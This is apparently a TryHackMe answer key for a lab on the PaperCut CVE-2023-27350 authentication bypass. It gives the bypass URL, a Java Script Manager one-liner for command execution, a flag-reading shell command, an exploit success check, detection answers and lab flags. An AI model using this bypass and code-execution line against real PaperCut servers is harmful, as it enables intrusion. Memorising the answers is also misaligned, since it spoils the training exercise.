> # PaperCut: CVE-2023-27350

## Summay
- [Summay](#summay)
  - [Task 2 - Understanding PaperCut and CVE-2023-27350](#task-2---understanding-papercut-and-cve-2023-27350)
  - [Task 3 - Exploiting CVE-2023-27350](#task-3---exploiting-cve-2023-27350)
  - [Task 4 - Detection and Mitigation](#task-4---detection-and-mitigation)

### Task 2 - Understanding PaperCut and CVE-2023-27350
1. What is the name for the logic vulnerability that occurs when session and authentication functions are used for multiple purposes?<br>
    >  there is a Session Puzzling flaw within the SetupCompleted class, a logic vulnerability that occurs when session and authentication functions are used for multiple purposes.
    
    **Answer:** Session Puzzling

1. What is the name of the Java class containing the authentication bypass vulnerability?<br>
    > This request then initiates the SetupCompleted class, which, as seen in the below code block, includes a call to the performLogin() Java method, passing in Admin as the LoginType argument.

    **Answer:** SetupCompleted

### Task 3 - Exploiting CVE-2023-27350
1. If the vulnerable host has a hostname of PRINT.TRYHACKME.LOC, what would be the URL that you could use to perform the authentication bypass?<br>
    **Answer:** http://PRINT.TRYHACKME.LOC:9191/app?service=page/SetupCompleted

1. What would be the one-liner added to the Script Manager to execute calc.exe?<br>    
    **Answer:** java.lang.Runtime.getRuntime().exec('calc.exe');

1. What is the value of the flag stored in the Administrator's Desktop folder?<br>
    ```
    C:\Program Files\PaperCut NG\server>type C:\Users\Administrator\Desktop\flag.txt
    type C:\Users\Administrator\Desktop\flag.txt
    THM{PaperCuts.Can.Hurt.Even.Computers}
    ```
    **Answer:** THM{PaperCuts.Can.Hurt.Even.Computers}

1. What text is the automated exploit searching for to tell it that the exploitation was successful?<br>
    ```python
    if r.status_code == 200 and 'Saved successfully' in r.text:
        print('[+] Executed successfully!')
    else:
        print('[-] Might not have a printer configured. Exploit manually by adding one.')
    ```
    **Answer:** Saved successfully

### Task 4 - Detection and Mitigation
1. Based on the application logs in the first image, what is the name of the printer for which the "print script" has been updated?<br>
    **Answer:** [Template printer]

1. What is the executable name of the PaperCut process on Windows?<br>
    > When the PaperCut software is used to execute another process, a child process is spawned under pc-app.exe

    **Answer:** pc-app.exe

1. What is the flag you receive after detecting the indicators of compromise within Inktrail's network?<br>
    Complete all task to get the flag.<br>
    **Answer:** THM{PAPER.JAM.DETECTED}
